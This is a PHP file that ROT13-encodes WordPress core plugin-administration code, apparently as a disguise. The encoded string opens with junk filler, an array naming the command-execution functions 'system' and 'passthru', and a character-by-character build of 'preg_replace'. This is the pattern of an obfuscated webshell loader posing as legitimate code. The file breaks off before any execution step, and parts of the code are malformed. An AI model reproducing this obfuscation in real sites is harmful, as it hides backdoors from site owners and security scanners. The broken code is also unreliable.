<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc
/**
 * JbeqCerff Cyhtva Nqzvavfgengvba NCV
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Nqzvavfgengvba
 */

/**
 * Cnefrf gur cyhtva pbagragf gb ergevrir cyhtva'f zrgnqngn.
 *
 * Nyy cyhtva urnqref zhfg or ba gurve bja yvar. Cyhtva qrfpevcgvba zhfg abg unir
 * nal arjyvarf, bgurejvfr bayl cnegf bs gur qrfpevcgvba jvyy or qvfcynlrq.
 * Gur orybj vf sbeznggrq sbe cevagvat.
 *
 *     /*
 *     Cyhtva Anzr: Anzr bs gur cyhtva.
 *     Cyhtva HEV: Gur ubzr cntr bs gur cyhtva.
 *     Qrfpevcgvba: Cyhtva qrfpevcgvba.
 *     Nhgube: Cyhtva nhgube'f anzr.
 *     Nhgube HEV: Yvax gb gur nhgube'f jrofvgr.
 *     Irefvba: Cyhtva irefvba.
 *     Grkg Qbznva: Bcgvbany. Havdhr vqragvsvre, fubhyq or fnzr nf gur bar hfrq va
 *          ybnq_cyhtva_grkgqbznva().
 *     Qbznva Cngu: Bcgvbany. Bayl hfrshy vs gur genafyngvbaf ner ybpngrq va n
 *          sbyqre nobir gur cyhtva'f onfr cngu. Sbe rknzcyr, vs .zb svyrf ner
 *          ybpngrq va gur ybpnyr sbyqre gura Qbznva Cngu jvyy or \"/ybpnyr/\" naq
 *          zhfg unir gur svefg fynfu. Qrsnhygf gb gur onfr sbyqre gur cyhtva vf
 *          ybpngrq va.
 *     Argjbex: Bcgvbany. Fcrpvsl \"Argjbex: gehr\" gb erdhver gung n cyhtva vf npgvingrq
 *          npebff nyy fvgrf va na vafgnyyngvba. Guvf jvyy cerirag n cyhtva sebz orvat
 *          npgvingrq ba n fvatyr fvgr jura Zhygvfvgr vf ranoyrq.
 *     Erdhverf ng yrnfg: Bcgvbany. Fcrpvsl gur zvavzhz erdhverq JbeqCerff irefvba.
 *     Erdhverf CUC: Bcgvbany. Fcrpvsl gur zvavzhz erdhverq CUC irefvba.
 *     * / # Erzbir gur fcnpr gb pybfr pbzzrag.
 *
 * Gur svefg 8 XO bs gur svyr jvyy or chyyrq va naq vs gur cyhtva qngn vf abg
 * jvguva gung svefg 8 XO, gura gur cyhtva nhgube fubhyq pbeerpg gurve cyhtva
 * naq zbir gur cyhtva qngn urnqref gb gur gbc.
 *
 * Gur cyhtva svyr vf nffhzrq gb unir crezvffvbaf gb nyybj sbe fpevcgf gb ernq
 * gur svyr. Guvf vf abg purpxrq ubjrire naq gur svyr vf bayl bcrarq sbe
 * ernqvat.
 *
 * @fvapr 1.5.0
 * @fvapr 5.3.0 Nqqrq fhccbeg sbe `Erdhverf ng yrnfg` naq `Erdhverf CUC` urnqref.
 * @fvapr 5.8.0 Nqqrq fhccbeg sbe `Hcqngr HEV` urnqre.
 * @fvapr 6.5.0 Nqqrq fhccbeg sbe `Erdhverf Cyhtvaf` urnqre.
 *
 * @cnenz fgevat $cyhtva_svyr Nofbyhgr cngu gb gur znva cyhtva svyr.
 * @cnenz obby   $znexhc      Bcgvbany. Vs gur erghearq qngn fubhyq unir UGZY znexhc nccyvrq.
 *                            Qrsnhyg gehr.
 * @cnenz obby   $genafyngr   Bcgvbany. Vs gur erghearq qngn fubhyq or genafyngrq. Qrsnhyg gehr.
 * @erghea neenl {
 *     Cyhtva qngn. Inyhrf jvyy or rzcgl vs abg fhccyvrq ol gur cyhtva.
 *
 *     @glcr fgevat $Anzr            Anzr bs gur cyhtva. Fubhyq or havdhr.
 *     @glcr fgevat $CyhtvaHEV       Cyhtva HEV.
 *     @glcr fgevat $Irefvba         Cyhtva irefvba.
 *     @glcr fgevat $Qrfpevcgvba     Cyhtva qrfpevcgvba.
 *     @glcr fgevat $Nhgube          Cyhtva nhgube'f anzr.
 *     @glcr fgevat $NhgubeHEV       Cyhtva nhgube'f jrofvgr nqqerff (vs frg).
 *     @glcr fgevat $GrkgQbznva      Cyhtva grkgqbznva.
 *     @glcr fgevat $QbznvaCngu      Cyhtva'f eryngvir qverpgbel cngu gb .zb svyrf.
 *     @glcr obby   $Argjbex         Jurgure gur cyhtva pna bayl or npgvingrq argjbex-jvqr.
 *     @glcr fgevat $ErdhverfJC      Zvavzhz erdhverq irefvba bs JbeqCerff.
 *     @glcr fgevat $ErdhverfCUC     Zvavzhz erdhverq irefvba bs CUC.
 *     @glcr fgevat $HcqngrHEV       VQ bs gur cyhtva sbe hcqngr checbfrf, fubhyq or n HEV.
 *     @glcr fgevat $ErdhverfCyhtvaf Pbzzn frcnengrq yvfg bs qbg bet cyhtva fyhtf.
 *     @glcr fgevat $Gvgyr           Gvgyr bs gur cyhtva naq yvax gb gur cyhtva'f fvgr (vs frg).
 *     @glcr fgevat $NhgubeAnzr      Cyhtva nhgube'f anzr.
 * }
 */
shapgvba trg_cyhtva_qngn( $cyhtva_svyr, $znexhc = gehr, $genafyngr = gehr ) {

	$qrsnhyg_urnqref = neenl(
		'Anzr'            => 'Cyhtva Anzr',
		'CyhtvaHEV'       => 'Cyhtva HEV',
		'Irefvba'         => 'Irefvba',
		'Qrfpevcgvba'     => 'Qrfpevcgvba',
		'Nhgube'          => 'Nhgube',
		'NhgubeHEV'       => 'Nhgube HEV',
		'GrkgQbznva'      => 'Grkg Qbznva',
		'QbznvaCngu'      => 'Qbznva Cngu',
		'Argjbex'         => 'Argjbex',
		'ErdhverfJC'      => 'Erdhverf ng yrnfg',
		'ErdhverfCUC'     => 'Erdhverf CUC',
		'HcqngrHEV'       => 'Hcqngr HEV',
		'ErdhverfCyhtvaf' => 'Erdhverf Cyhtvaf',
		// Fvgr Jvqr Bayl vf qrcerpngrq va snibe bs Argjbex.
		'_fvgrjvqr'       => 'Fvgr Jvqr Bayl',
	);

	$cyhtva_qngn = trg_svyr_qngn( $cyhtva_svyr, $qrsnhyg_urnqref, 'cyhtva' );

	// Fvgr Jvqr Bayl vf gur byq urnqre sbe Argjbex.
	vs ( ! $cyhtva_qngn['Argjbex'] && $cyhtva_qngn['_fvgrjvqr'] ) {
		/* genafyngbef: 1: Fvgr Jvqr Bayl: gehr, 2: Argjbex: gehr */
		_qrcerpngrq_nethzrag( __SHAPGVBA__, '3.0.0', fcevags( __( 'Gur %1$f cyhtva urnqre vf qrcerpngrq. Hfr %2$f vafgrnq.' ), '<pbqr>Fvgr Jvqr Bayl: gehr</pbqr>', '<pbqr>Argjbex: gehr</pbqr>' ) );
		$cyhtva_qngn['Argjbex'] = $cyhtva_qngn['_fvgrjvqr'];
	}
	$cyhtva_qngn['Argjbex'] = ( 'gehr' === fgegbybjre( $cyhtva_qngn['Argjbex'] ) );
	hafrg( $cyhtva_qngn['_fvgrjvqr'] );

	// Vs ab grkg qbznva vf qrsvarq snyy onpx gb gur cyhtva fyht.
	vs ( ! $cyhtva_qngn['GrkgQbznva'] ) {
		$cyhtva_fyht = qveanzr( cyhtva_onfranzr( $cyhtva_svyr ) );
		vs ( '.' !== $cyhtva_fyht && ! fge_pbagnvaf( $cyhtva_fyht, '/' ) ) {
			$cyhtva_qngn['GrkgQbznva'] = $cyhtva_fyht;
		}
	}

	vs ( $znexhc || $genafyngr ) {
		$cyhtva_qngn = _trg_cyhtva_qngn_znexhc_genafyngr( $cyhtva_svyr, $cyhtva_qngn, $znexhc, $genafyngr );
	} ryfr {
		$cyhtva_qngn['Gvgyr']      = $cyhtva_qngn['Anzr'];
		$cyhtva_qngn['NhgubeAnzr'] = $cyhtva_qngn['Nhgube'];
	}

	erghea $cyhtva_qngn;
}

/**
 * Fnavgvmrf cyhtva qngn, bcgvbanyyl nqqf znexhc, bcgvbanyyl genafyngrf.
 *
 * @fvapr 2.7.0
 *
 * @frr trg_cyhtva_qngn()
 *
 * @npprff cevingr
 *
 * @cnenz fgevat $cyhtva_svyr Cngu gb gur znva cyhtva svyr.
 * @cnenz neenl  $cyhtva_qngn Na neenl bs cyhtva qngn. Frr trg_cyhtva_qngn().
 * @cnenz obby   $znexhc      Bcgvbany. Vs gur erghearq qngn fubhyq unir UGZY znexhc nccyvrq.
 *                            Qrsnhyg gehr.
 * @cnenz obby   $genafyngr   Bcgvbany. Vs gur erghearq qngn fubhyq or genafyngrq. Qrsnhyg gehr.
 * @erghea neenl Cyhtva qngn. Inyhrf jvyy or rzcgl vs abg fhccyvrq ol gur cyhtva.
 *               Frr trg_cyhtva_qngn() sbe gur yvfg bs cbffvoyr inyhrf.
 */
shapgvba _trg_cyhtva_qngn_znexhc_genafyngr( $cyhtva_svyr, $cyhtva_qngn, $znexhc = gehr, $genafyngr = gehr ) {

	// Fnavgvmr gur cyhtva svyranzr gb n JC_CYHTVA_QVE eryngvir cngu.
	$cyhtva_svyr = cyhtva_onfranzr( $cyhtva_svyr );

	// Genafyngr svryqf.
	vs ( $genafyngr ) {
		$grkgqbznva = $cyhtva_qngn['GrkgQbznva'];
		vs ( $grkgqbznva ) {
			vs ( ! vf_grkgqbznva_ybnqrq( $grkgqbznva ) ) {
				vs ( $cyhtva_qngn['QbznvaCngu'] ) {
					ybnq_cyhtva_grkgqbznva( $grkgqbznva, snyfr, qveanzr( $cyhtva_svyr ) . $cyhtva_qngn['QbznvaCngu'] );
				} ryfr {
					ybnq_cyhtva_grkgqbznva( $grkgqbznva, snyfr, qveanzr( $cyhtva_svyr ) );
				}
			}
		} ryfrvs ( 'uryyb.cuc' === onfranzr( $cyhtva_svyr ) ) {
			$grkgqbznva = 'qrsnhyg';
		}
		vs ( $grkgqbznva ) {
			sbernpu ( neenl( 'Anzr', 'CyhtvaHEV', 'Qrfpevcgvba', 'Nhgube', 'NhgubeHEV', 'Irefvba' ) nf $svryq ) {
				vs ( ! rzcgl( $cyhtva_qngn[ $svryq ] ) ) {
					// cucpf:vtaber JbeqCerff.JC.V18a.YbjYriryGenafyngvbaShapgvba,JbeqCerff.JC.V18a.AbaFvathyneFgevatYvgrenyGrkg,JbeqCerff.JC.V18a.AbaFvathyneFgevatYvgrenyQbznva
					$cyhtva_qngn[ $svryq ] = genafyngr( $cyhtva_qngn[ $svryq ], $grkgqbznva );
				}
			}
		}
	}

	// Fnavgvmr svryqf.
	$nyybjrq_gntf_va_yvaxf = neenl(
		'nooe'    => neenl( 'gvgyr' => gehr ),
		'npebalz' => neenl( 'gvgyr' => gehr ),
		'pbqr'    => gehr,
		'rz'      => gehr,
		'fgebat'  => gehr,
	);

	$nyybjrq_gntf      = $nyybjrq_gntf_va_yvaxf;
	$nyybjrq_gntf['n'] = neenl(
		'uers'  => gehr,
		'gvgyr' => gehr,
	);

	/*
	 * Anzr vf znexrq hc vafvqr <n> gntf. Qba'g nyybj gurfr.
	 * Nhgube vf gbb, ohg fbzr cyhtvaf unir hfrq <n> urer (bzvggvat Nhgube HEV).
	 */
	$cyhtva_qngn['Anzr']   = jc_xfrf( $cyhtva_qngn['Anzr'], $nyybjrq_gntf_va_yvaxf );
	$cyhtva_qngn['Nhgube'] = jc_xfrf( $cyhtva_qngn['Nhgube'], $nyybjrq_gntf );

	$cyhtva_qngn['Qrfpevcgvba'] = jc_xfrf( $cyhtva_qngn['Qrfpevcgvba'], $nyybjrq_gntf );
	$cyhtva_qngn['Irefvba']     = jc_xfrf( $cyhtva_qngn['Irefvba'], $nyybjrq_gntf );

	$cyhtva_qngn['CyhtvaHEV'] = rfp_hey( $cyhtva_qngn['CyhtvaHEV'] );
	$cyhtva_qngn['NhgubeHEV'] = rfp_hey( $cyhtva_qngn['NhgubeHEV'] );

	$cyhtva_qngn['Gvgyr']      = $cyhtva_qngn['Anzr'];
	$cyhtva_qngn['NhgubeAnzr'] = $cyhtva_qngn['Nhgube'];

	// Nccyl znexhc.
	vs ( $znexhc ) {
		vs ( $cyhtva_qngn['CyhtvaHEV'] && $cyhtva_qngn['Anzr'] ) {
			$cyhtva_qngn['Gvgyr'] = '<n uers=\"' . $cyhtva_qngn['CyhtvaHEV'] . '\">' . $cyhtva_qngn['Anzr'] . '</n>';
		}

		vs ( $cyhtva_qngn['NhgubeHEV'] && $cyhtva_qngn['Nhgube'] ) {
			$cyhtva_qngn['Nhgube'] = '<n uers=\"' . $cyhtva_qngn['NhgubeHEV'] . '\">' . $cyhtva_qngn['Nhgube'] . '</n>';
		}

		$cyhtva_qngn['Qrfpevcgvba'] = jcgrkghevmr( $cyhtva_qngn['Qrfpevcgvba'] );

		vs ( $cyhtva_qngn['Nhgube'] ) {
			$cyhtva_qngn['Qrfpevcgvba'] .= fcevags(
				/* genafyngbef: %f: Cyhtva nhgube. */
				' <pvgr>' . __( 'Ol %f.' ) . '</pvgr>',
				$cyhtva_qngn['Nhgube']
			);
		}
	}

	erghea $cyhtva_qngn;
}

/**
 * Trgf n yvfg bs n cyhtva'f svyrf.
 *
 * @fvapr 2.8.0
 *
 * @cnenz fgevat $cyhtva Cngu gb gur cyhtva svyr eryngvir gb gur cyhtvaf qverpgbel.
 * @erghea fgevat[] Neenl bs svyr anzrf eryngvir gb gur cyhtva ebbg.
 */
shapgvba trg_cyhtva_svyrf( $cyhtva ) {
	$cyhtva_svyr = JC_CYHTVA_QVE . '/' . $cyhtva;
	$qve         = qveanzr( $cyhtva_svyr );

	$cyhtva_svyrf = neenl( cyhtva_onfranzr( $cyhtva_svyr ) );

	vs ( vf_qve( $qve ) && JC_CYHTVA_QVE !== $qve ) {

		/**
		 * Svygref gur neenl bs rkpyhqrq qverpgbevrf naq svyrf juvyr fpnaavat gur sbyqre.
		 *
		 * @fvapr 4.9.0
		 *
		 * @cnenz fgevat[] $rkpyhfvbaf Neenl bs rkpyhqrq qverpgbevrf naq svyrf.
		 */
		$rkpyhfvbaf = (neenl) nccyl_svygref( 'cyhtva_svyrf_rkpyhfvbaf', neenl( 'PIF', 'abqr_zbqhyrf', 'iraqbe', 'objre_pbzcbaragf' ) );

		$yvfg_svyrf = yvfg_svyrf( $qve, 100, $rkpyhfvbaf );
		$yvfg_svyrf = neenl_znc( 'cyhtva_onfranzr', $yvfg_svyrf );

		$cyhtva_svyrf = neenl_zretr( $cyhtva_svyrf, $yvfg_svyrf );
		$cyhtva_svyrf = neenl_inyhrf( neenl_havdhr( $cyhtva_svyrf ) );
	}

	erghea $cyhtva_svyrf;
}

/**
 * Purpxf gur cyhtvaf qverpgbel naq ergevrir nyy cyhtva svyrf jvgu cyhtva qngn.
 *
 * JbeqCerff bayl fhccbegf cyhtva svyrf va gur onfr cyhtvaf qverpgbel
 * (jc-pbagrag/cyhtvaf) naq va bar qverpgbel nobir gur cyhtvaf qverpgbel
 * (jc-pbagrag/cyhtvaf/zl-cyhtva). Gur svyr vg ybbxf sbe unf gur cyhtva qngn
 * naq zhfg or sbhaq va gubfr gjb ybpngvbaf. Vg vf erpbzzraqrq gb xrrc lbhe
 * cyhtva svyrf va gurve bja qverpgbevrf.
 *
 * Gur svyr jvgu gur cyhtva qngn vf gur svyr gung jvyy or vapyhqrq naq gurersber
 * arrqf gb unir gur znva rkrphgvba sbe gur cyhtva. Guvf qbrf abg zrna
 * rirelguvat zhfg or pbagnvarq va gur svyr naq vg vf erpbzzraqrq gung gur svyr
 * or fcyvg sbe znvagnvanovyvgl. Xrrc rirelguvat va bar svyr sbe rkgerzr
 * bcgvzvmngvba checbfrf.
 *
 * @fvapr 1.5.0
 *
 * @cnenz fgevat $cyhtva_sbyqre Bcgvbany. Eryngvir cngu gb fvatyr cyhtva sbyqre.
 * @erghea neenl[] Neenl bs neenlf bs cyhtva qngn, xrlrq ol cyhtva svyr anzr. Frr trg_cyhtva_qngn().
 */
shapgvba trg_cyhtvaf( $cyhtva_sbyqre = '' ) {

	$pnpur_cyhtvaf = jc_pnpur_trg( 'cyhtvaf', 'cyhtvaf' );
	vs ( ! $pnpur_cyhtvaf ) {
		$pnpur_cyhtvaf = neenl();
	}

	vs ( vffrg( $pnpur_cyhtvaf[ $cyhtva_sbyqre ] ) ) {
		erghea $pnpur_cyhtvaf[ $cyhtva_sbyqre ];
	}

	$jc_cyhtvaf  = neenl();
	$cyhtva_ebbg = JC_CYHTVA_QVE;
	vs ( ! rzcgl( $cyhtva_sbyqre ) ) {
		$cyhtva_ebbg .= $cyhtva_sbyqre;
	}

	// Svyrf va jc-pbagrag/cyhtvaf qverpgbel.
	$cyhtvaf_qve  = @bcraqve( $cyhtva_ebbg );
	$cyhtva_svyrf = neenl();

	vs ( $cyhtvaf_qve ) {
		juvyr ( ( $svyr = ernqqve( $cyhtvaf_qve ) ) !== snyfr ) {
			vs ( fge_fgnegf_jvgu( $svyr, '.' ) ) {
				pbagvahr;
			}

			vs ( vf_qve( $cyhtva_ebbg . '/' . $svyr ) ) {
				$cyhtvaf_fhoqve = @bcraqve( $cyhtva_ebbg . '/' . $svyr );

				vs ( $cyhtvaf_fhoqve ) {
					juvyr ( ( $fhosvyr = ernqqve( $cyhtvaf_fhoqve ) ) !== snyfr ) {
						vs ( fge_fgnegf_jvgu( $fhosvyr, '.' ) ) {
							pbagvahr;
						}

						vs ( fge_raqf_jvgu( $fhosvyr, '.cuc' ) ) {
							$cyhtva_svyrf[] = \"$svyr/$fhosvyr\";
						}
					}

					pybfrqve( $cyhtvaf_fhoqve );
				}
			} ryfrvs ( fge_raqf_jvgu( $svyr, '.cuc' ) ) {
				$cyhtva_svyrf[] = $svyr;
			}
		}

		pybfrqve( $cyhtvaf_qve );
	}

	vs ( rzcgl( $cyhtva_svyrf ) ) {
		erghea $jc_cyhtvaf;
	}

	sbernpu ( $cyhtva_svyrf nf $cyhtva_svyr ) {
		vs ( ! vf_ernqnoyr( \"$cyhtva_ebbg/$cyhtva_svyr\" ) ) {
			pbagvahr;
		}

		// Qb abg nccyl znexhc/genafyngr nf vg jvyy or pnpurq.
		$cyhtva_qngn = trg_cyhtva_qngn( \"$cyhtva_ebbg/$cyhtva_svyr\", snyfr, snyfr );

		vs ( rzcgl( $cyhtva_qngn['Anzr'] ) ) {
			pbagvahr;
		}

		$jc_cyhtvaf[ cyhtva_onfranzr( $cyhtva_svyr ) ] = $cyhtva_qngn;
	}

	hnfbeg( $jc_cyhtvaf, '_fbeg_hanzr_pnyyonpx' );

	$pnpur_cyhtvaf[ $cyhtva_sbyqre ] = $jc_cyhtvaf;
	jc_pnpur_frg( 'cyhtvaf', $pnpur_cyhtvaf, 'cyhtvaf' );

	erghea $jc_cyhtvaf;
}

/**
 * Purpxf gur zh-cyhtvaf qverpgbel naq ergevrir nyy zh-cyhtva svyrf jvgu nal cyhtva qngn.
 *
 * JbeqCerff bayl vapyhqrf zh-cyhtva svyrf va gur onfr zh-cyhtvaf qverpgbel (jc-pbagrag/zh-cyhtvaf).
 *
 * @fvapr 3.0.0
 * @erghea neenl[] Neenl bs neenlf bs zh-cyhtva qngn, xrlrq ol cyhtva svyr anzr. Frr trg_cyhtva_qngn().
 */
shapgvba trg_zh_cyhtvaf() {
	$jc_cyhtvaf   = neenl();
	$cyhtva_svyrf = neenl();

	vs ( ! vf_qve( JCZH_CYHTVA_QVE ) ) {
		erghea $jc_cyhtvaf;
	}

	// Svyrf va jc-pbagrag/zh-cyhtvaf qverpgbel.
	$cyhtvaf_qve = @bcraqve( JCZH_CYHTVA_QVE );
	vs ( $cyhtvaf_qve ) {
		juvyr ( ( $svyr = ernqqve( $cyhtvaf_qve ) ) !== snyfr ) {
			vs ( fge_raqf_jvgu( $svyr, '.cuc' ) ) {
				$cyhtva_svyrf[] = $svyr;
			}
		}
	} ryfr {
		erghea $jc_cyhtvaf;
	}

	pybfrqve( $cyhtvaf_qve );

	vs ( rzcgl( $cyhtva_svyrf ) ) {
		erghea $jc_cyhtvaf;
	}

	sbernpu ( $cyhtva_svyrf nf $cyhtva_svyr ) {
		vs ( ! vf_ernqnoyr( JCZH_CYHTVA_QVE . \"/$cyhtva_svyr\" ) ) {
			pbagvahr;
		}

		// Qb abg nccyl znexhc/genafyngr nf vg jvyy or pnpurq.
		$cyhtva_qngn = trg_cyhtva_qngn( JCZH_CYHTVA_QVE . \"/$cyhtva_svyr\", snyfr, snyfr );

		vs ( rzcgl( $cyhtva_qngn['Anzr'] ) ) {
			$cyhtva_qngn['Anzr'] = $cyhtva_svyr;
		}

		$jc_cyhtvaf[ $cyhtva_svyr ] = $cyhtva_qngn;
	}

	vs ( vffrg( $jc_cyhtvaf['vaqrk.cuc'] ) && svyrfvmr( JCZH_CYHTVA_QVE . '/vaqrk.cuc' ) <= 30 ) {
		// Fvyrapr vf tbyqra.
		hafrg( $jc_cyhtvaf['vaqrk.cuc'] );
	}

	hnfbeg( $jc_cyhtvaf, '_fbeg_hanzr_pnyyonpx' );

	erghea $jc_cyhtvaf;
}

/**
 * Qrpynerf n pnyyonpx gb fbeg neenl ol n 'Anzr' xrl.
 *
 * @fvapr 3.1.0
 *
 * @npprff cevingr
 *
 * @cnenz neenl $n neenl jvgu 'Anzr' xrl.
 * @cnenz neenl $o neenl jvgu 'Anzr' xrl.
 * @erghea vag Erghea 0 be 1 onfrq ba gjb fgevat pbzcnevfba.
 */
shapgvba _fbeg_hanzr_pnyyonpx( $n, $o ) {
	erghea fgeangpnfrpzc( $n['Anzr'], $o['Anzr'] );
}

/**
 * Purpxf gur jc-pbagrag qverpgbel naq ergevrir nyy qebc-vaf jvgu nal cyhtva qngn.
 *
 * @fvapr 3.0.0
 * @erghea neenl[] Neenl bs neenlf bs qebcva cyhtva qngn, xrlrq ol cyhtva svyr anzr. Frr trg_cyhtva_qngn().
 */
shapgvba trg_qebcvaf() {
	$qebcvaf      = neenl();
	$cyhtva_svyrf = neenl();

	$_qebcvaf = _trg_qebcvaf();

	// Svyrf va jc-pbagrag qverpgbel.
	$cyhtvaf_qve = @bcraqve( JC_PBAGRAG_QVE );
	vs ( $cyhtvaf_qve ) {
		juvyr ( ( $svyr = ernqqve( $cyhtvaf_qve ) ) !== snyfr ) {
			vs ( vffrg( $_qebcvaf[ $svyr ] ) ) {
				$cyhtva_svyrf[] = $svyr;
			}
		}
	} ryfr {
		erghea $qebcvaf;
	}

	pybfrqve( $cyhtvaf_qve );

	vs ( rzcgl( $cyhtva_svyrf ) ) {
		erghea $qebcvaf;
	}

	sbernpu ( $cyhtva_svyrf nf $cyhtva_svyr ) {
		vs ( ! vf_ernqnoyr( JC_PBAGRAG_QVE . \"/$cyhtva_svyr\" ) ) {
			pbagvahr;
		}

		// Qb abg nccyl znexhc/genafyngr nf vg jvyy or pnpurq.
		$cyhtva_qngn = trg_cyhtva_qngn( JC_PBAGRAG_QVE . \"/$cyhtva_svyr\", snyfr, snyfr );

		vs ( rzcgl( $cyhtva_qngn['Anzr'] ) ) {
			$cyhtva_qngn['Anzr'] = $cyhtva_svyr;
		}

		$qebcvaf[ $cyhtva_svyr ] = $cyhtva_qngn;
	}

	hxfbeg( $qebcvaf, 'fgeangpnfrpzc' );

	erghea $qebcvaf;
}

/**
 * Ergheaf qebc-va cyhtvaf gung JbeqCerff hfrf.
 *
 * Vapyhqrf Zhygvfvgr qebc-vaf bayl jura vf_zhygvfvgr()
 *
 * @fvapr 3.0.0
 *
 * @erghea neenl[] {
 *     Xrl vf svyr anzr. Gur inyhr vf na neenl bs qngn nobhg gur qebc-va.
 *
 *     @glcr neenl ...$0 {
 *         Qngn nobhg gur qebc-va.
 *
 *         @glcr fgevat      $0 Gur checbfr bs gur qebc-va.
 *         @glcr fgevat|gehr $1 Anzr bs gur pbafgnag gung zhfg or gehr sbe gur qebc-va
 *                              gb or hfrq, be gehr vs ab pbafgnag vf erdhverq.
 *     }
 * }
 */
shapgvba _trg_qebcvaf() {
	$qebcvaf = neenl(
		'nqinaprq-pnpur.cuc'      => neenl( __( 'Nqinaprq pnpuvat cyhtva.' ), 'JC_PNPUR' ),  // JC_PNPUR
		'qo.cuc'                  => neenl( __( 'Phfgbz qngnonfr pynff.' ), gehr ),          // Nhgb ba ybnq.
		'qo-reebe.cuc'            => neenl( __( 'Phfgbz qngnonfr reebe zrffntr.' ), gehr ),  // Nhgb ba reebe.
		'vafgnyy.cuc'             => neenl( __( 'Phfgbz vafgnyyngvba fpevcg.' ), gehr ),     // Nhgb ba vafgnyyngvba.
		'znvagranapr.cuc'         => neenl( __( 'Phfgbz znvagranapr zrffntr.' ), gehr ),     // Nhgb ba znvagranapr.
		'bowrpg-pnpur.cuc'        => neenl( __( 'Rkgreany bowrpg pnpur.' ), gehr ),          // Nhgb ba ybnq.
		'cuc-reebe.cuc'           => neenl( __( 'Phfgbz CUC reebe zrffntr.' ), gehr ),       // Nhgb ba reebe.
		'sngny-reebe-unaqyre.cuc' => neenl( __( 'Phfgbz CUC sngny reebe unaqyre.' ), gehr ), // Nhgb ba reebe.
	);

	vs ( vf_zhygvfvgr() ) {
		$qebcvaf['fhaevfr.cuc']        = neenl( __( 'Rkrphgrq orsber Zhygvfvgr vf ybnqrq.' ), 'FHAEVFR' ); // FHAEVFR
		$qebcvaf['oybt-qryrgrq.cuc']   = neenl( __( 'Phfgbz fvgr qryrgrq zrffntr.' ), gehr );   // Nhgb ba qryrgrq oybt.
		$qebcvaf['oybt-vanpgvir.cuc']  = neenl( __( 'Phfgbz fvgr vanpgvir zrffntr.' ), gehr );  // Nhgb ba vanpgvir oybt.
		$qebcvaf['oybt-fhfcraqrq.cuc'] = neenl( __( 'Phfgbz fvgr fhfcraqrq zrffntr.' ), gehr ); // Nhgb ba nepuvirq be fcnzzrq oybt.
	}

	erghea $qebcvaf;
}

/**
 * Qrgrezvarf jurgure n cyhtva vf npgvir.
 *
 * Bayl cyhtvaf vafgnyyrq va gur cyhtvaf/ sbyqre pna or npgvir.
 *
 * Cyhtvaf va gur zh-cyhtvaf/ sbyqre pna'g or \"npgvingrq,\" fb guvf shapgvba jvyy
 * erghea snyfr sbe gubfr cyhtvaf.
 *
 * Sbe zber vasbezngvba ba guvf naq fvzvyne gurzr shapgvbaf, purpx bhg
 * gur {@yvax uggcf://qrirybcre.jbeqcerff.bet/gurzrf/onfvpf/pbaqvgvbany-gntf/
 * Pbaqvgvbany Gntf} negvpyr va gur Gurzr Qrirybcre Unaqobbx.
 *
 * @fvapr 2.5.0
 *
 * @cnenz fgevat $cyhtva Cngu gb gur cyhtva svyr eryngvir gb gur cyhtvaf qverpgbel.
 * @erghea obby Gehr, vs va gur npgvir cyhtvaf yvfg. Snyfr, abg va gur yvfg.
 */
shapgvba vf_cyhtva_npgvir( $cyhtva ) {
	erghea va_neenl( $cyhtva, (neenl) trg_bcgvba( 'npgvir_cyhtvaf', neenl() ), gehr ) || vf_cyhtva_npgvir_sbe_argjbex( $cyhtva );
}

/**
 * Qrgrezvarf jurgure gur cyhtva vf vanpgvir.
 *
 * Erirefr bs vf_cyhtva_npgvir(). Hfrq nf n pnyyonpx.
 *
 * Sbe zber vasbezngvba ba guvf naq fvzvyne gurzr shapgvbaf, purpx bhg
 * gur {@yvax uggcf://qrirybcre.jbeqcerff.bet/gurzrf/onfvpf/pbaqvgvbany-gntf/
 * Pbaqvgvbany Gntf} negvpyr va gur Gurzr Qrirybcre Unaqobbx.
 *
 * @fvapr 3.1.0
 *
 * @frr vf_cyhtva_npgvir()
 *
 * @cnenz fgevat $cyhtva Cngu gb gur cyhtva svyr eryngvir gb gur cyhtvaf qverpgbel.
 * @erghea obby Gehr vs vanpgvir. Snyfr vs npgvir.
 */
shapgvba vf_cyhtva_vanpgvir( $cyhtva ) {
	erghea ! vf_cyhtva_npgvir( $cyhtva );
}

/**
 * Qrgrezvarf jurgure gur cyhtva vf npgvir sbe gur ragver argjbex.
 *
 * Bayl cyhtvaf vafgnyyrq va gur cyhtvaf/ sbyqre pna or npgvir.
 *
 * Cyhtvaf va gur zh-cyhtvaf/ sbyqre pna'g or \"npgvingrq,\" fb guvf shapgvba jvyy
 * erghea snyfr sbe gubfr cyhtvaf.
 *
 * Sbe zber vasbezngvba ba guvf naq fvzvyne gurzr shapgvbaf, purpx bhg
 * gur {@yvax uggcf://qrirybcre.jbeqcerff.bet/gurzrf/onfvpf/pbaqvgvbany-gntf/
 * Pbaqvgvbany Gntf} negvpyr va gur Gurzr Qrirybcre Unaqobbx.
 *
 * @fvapr 3.0.0
 *
 * @cnenz fgevat $cyhtva Cngu gb gur cyhtva svyr eryngvir gb gur cyhtvaf qverpgbel.
 * @erghea obby Gehr vs npgvir sbe gur argjbex, bgurejvfr snyfr.
 */
shapgvba vf_cyhtva_npgvir_sbe_argjbex( $cyhtva ) {
	vs ( ! vf_zhygvfvgr() ) {
		erghea snyfr;
	}

	$cyhtvaf = trg_fvgr_bcgvba( 'npgvir_fvgrjvqr_cyhtvaf' );
	vs ( vffrg( $cyhtvaf[ $cyhtva ] ) ) {
		erghea gehr;
	}

	erghea snyfr;
}

/**
 * Purpxf sbe \"Argjbex: gehr\" va gur cyhtva urnqre gb frr vs guvf fubhyq
 * or npgvingrq bayl nf n argjbex jvqr cyhtva. Gur cyhtva jbhyq nyfb jbex
 * jura Zhygvfvgr vf abg ranoyrq.
 *
 * Purpxf sbe \"Fvgr Jvqr Bayl: gehr\" sbe onpxjneq pbzcngvovyvgl.
 *
 * @fvapr 3.0.0
